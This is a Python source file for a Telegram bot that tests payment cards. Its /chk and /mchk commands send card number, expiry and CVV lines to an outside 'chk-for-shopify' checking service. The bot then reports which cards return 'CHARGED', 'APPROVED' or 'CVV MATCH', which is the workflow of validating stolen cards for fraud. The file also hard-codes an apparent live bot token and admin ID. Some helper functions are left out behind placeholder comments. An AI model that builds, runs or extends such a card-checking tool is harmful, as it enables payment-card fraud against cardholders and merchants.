import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# BOT Config
BOT_TOKEN = "7953997114:AAFX4O_PlM1TjnDinJ0Iezuj15NUstWkvQU"
MAIN_ADMIN_ID = 5103348494
bot = telebot.TeleBot(BOT_TOKEN)

# ---------------- Helper Functions ---------------- #
def loading_animation(chat_id, message_id, stop_event):
    """Show loading animation while processing"""
    frames = ["🔄 Processing...", "🔄 Processing... 🌟", "🔄 Processing... 💳", 
              "🔄 Processing... 🔍", "🔄 Processing... ⚡"]
    i = 0
    while not stop_event.is_set():
        bot.edit_message_text(frames[i % len(frames)], chat_id, message_id)
        time.sleep(0.5)
        i += 1

def clean_response(text):
    """Clean gateway response"""
    return text.replace('<pre>', '').replace('</pre>', '')

# ... [keep all your existing helper functions] ...

# ---------------- Enhanced Gateway Call ---------------- #
def check_card_gateway(cc_line):
    try:
        url = f"https://chk-for-shopify.onrender.com?lista={cc_line}"
        headers = {"User-Agent": generate_user_agent()}
        r = requests.get(url, headers=headers, timeout=20)
        return clean_response(r.text.strip())
    except Exception as e:
        return f"❌ Error checking {cc_line}: {e}"

# ---------------- Enhanced Commands ---------------- #
@bot.message_handler(commands=["chk"])
def chk_handler(msg):
    if not is_authorized(msg.from_user.id):
        return bot.reply_to(msg, "❌ Not authorized.")

    # Get CC details
    cc = None
    if msg.reply_to_message:
        cc = normalize_card(msg.reply_to_message.text or "")
    else:
        args = msg.text.split(None, 1)
        if len(args) > 1:
            cc = normalize_card(args[1]) or args[1]

    if not cc:
        return bot.reply_to(msg, "❌ Invalid format. Use `/chk 4556737586899855|12|2026|123`")

    # Show loading animation
    processing = bot.reply_to(msg, "🔄 Starting verification...")
    stop_event = threading.Event()
    loading_thread = threading.Thread(target=loading_animation, args=(msg.chat.id, processing.message_id, stop_event))
    loading_thread.start()

    def run_check():
        try:
            result = check_card_gateway(cc)
            stop_event.set()
            loading_thread.join()
            bot.edit_message_text(result, msg.chat.id, processing.message_id)
        except Exception as e:
            stop_event.set()
            loading_thread.join()
            bot.edit_message_text(f"❌ Error: {str(e)}", msg.chat.id, processing.message_id)

    threading.Thread(target=run_check).start()

@bot.message_handler(commands=["mchk"])
def mchk_handler(msg):
    if not is_authorized(msg.from_user.id):
        return bot.reply_to(msg, "❌ Not authorized.")

    # Determine response location
    response_chat = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id

    if not msg.reply_to_message:
        return bot.send_message(response_chat, "❌ Reply with a CC list file or text.")

    # Get CCs from message
    text = ""
    if msg.reply_to_message.document:
        file_info = bot.get_file(msg.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode("utf-8", errors="ignore")
    else:
        text = msg.reply_to_message.text or ""

    # Process and limit to 10 cards
    cc_lines = []
    for line in text.splitlines():
        norm = normalize_card(line.strip())
        if norm:
            cc_lines.append(norm)
            if len(cc_lines) >= 10:  # Limit to 10 cards
                break

    if not cc_lines:
        return bot.send_message(response_chat, "❌ No valid cards found.")

    if len(cc_lines) > 10:
        bot.send_message(response_chat, "⚠️ Only first 10 cards will be processed")

    total = len(cc_lines)
    approved, declined, checked = 0, 0, 0

    # Create status message
    kb = InlineKeyboardMarkup(row_width=1)
    status_msg = bot.send_message(
        response_chat,
        f"🔮 Starting mass check of {total} cards...\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"🔍 Checked: 0/{total}",
        reply_markup=kb
    )

    def process_cards():
        nonlocal approved, declined, checked
        for cc in cc_lines:
            checked += 1
            result = check_card_gateway(cc)
            
            if any(x in result for x in ["CHARGED", "CVV MATCH", "APPROVED"]):
                approved += 1
                bot.send_message(response_chat, f"💳 Card {checked}/{total}\n{result}")
            else:
                declined += 1

            # Update status
            bot.edit_message_text(
                f"🔮 Mass check progress:\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"🔍 Checked: {checked}/{total}",
                response_chat,
                status_msg.message_id
            )
            time.sleep(2)  # Rate limiting

        bot.send_message(response_chat, f"✅ Mass check completed!\nApproved: {approved} | Declined: {declined}")

    threading.Thread(target=process_cards).start()

# ... [keep the rest of your existing code] ...
